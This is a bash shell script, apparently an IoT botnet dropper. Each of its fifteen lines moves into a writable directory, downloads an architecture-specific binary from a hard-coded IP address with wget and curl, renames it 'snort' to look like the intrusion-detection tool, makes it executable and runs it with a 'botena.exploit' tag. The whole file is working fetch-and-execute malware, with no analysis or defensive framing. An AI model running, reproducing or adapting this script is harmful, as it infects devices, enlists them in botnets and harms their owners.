#!/bin/bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.19.141.122/bins/x86; curl -O http://46.19.141.122/bins/x86; cat x86 > snort; chmod +x *; ./snort botena.exploit
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.19.141.122/bins/mips; curl -O http://46.19.141.122/bins/mips; cat mips > snort; chmod +x *; ./snort botena.exploit
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.19.141.122/bins/mpsl; curl -O http://46.19.141.122/bins/mpsl; cat mpsl > snort; chmod +x *; ./snort botena.exploit
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.19.141.122/bins/arm; curl -O http://46.19.141.122/bins/arm; cat arm > snort; chmod +x *; ./snort botena.exploit
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.19.141.122/bins/arm5; curl -O http://46.19.141.122/bins/arm5; cat arm5 > snort; chmod +x *; ./snort botena.exploit
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.19.141.122/bins/arm6; curl -O http://46.19.141.122/bins/arm6; cat arm6 > snort; chmod +x *; ./snort botena.exploit
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.19.141.122/bins/arm7; curl -O http://46.19.141.122/bins/arm7; cat arm7 > snort; chmod +x *; ./snort botena.exploit
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.19.141.122/bins/ppc; curl -O http://46.19.141.122/bins/ppc; cat ppc > snort; chmod +x *; ./snort botena.exploit
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.19.141.122/bins/m68k; curl -O http://46.19.141.122/bins/m68k; cat m68k > snort; chmod +x *; ./snort botena.exploit
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.19.141.122/bins/sh4; curl -O http://46.19.141.122/bins/sh4; cat sh4 > snort; chmod +x *; ./snort botena.exploit
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.19.141.122/bins/spc; curl -O http://46.19.141.122/bins/spc; cat spc > snort; chmod +x *; ./snort botena.exploit
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.19.141.122/bins/arc; curl -O http://46.19.141.122/bins/arc; cat arc > snort; chmod +x *; ./snort botena.exploit
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.19.141.122/bins/x86_64; curl -O http://46.19.141.122/bins/x86_64; cat x86_64 > snort; chmod +x *; ./snort botena.exploit
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.19.141.122/bins/i686; curl -O http://46.19.141.122/bins/i686; cat i686 > snort; chmod +x *; ./snort botena.exploit
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.19.141.122/bins/i486; curl -O http://46.19.141.122/bins/i486; cat i486 > snort; chmod +x *; ./snort botena.exploit
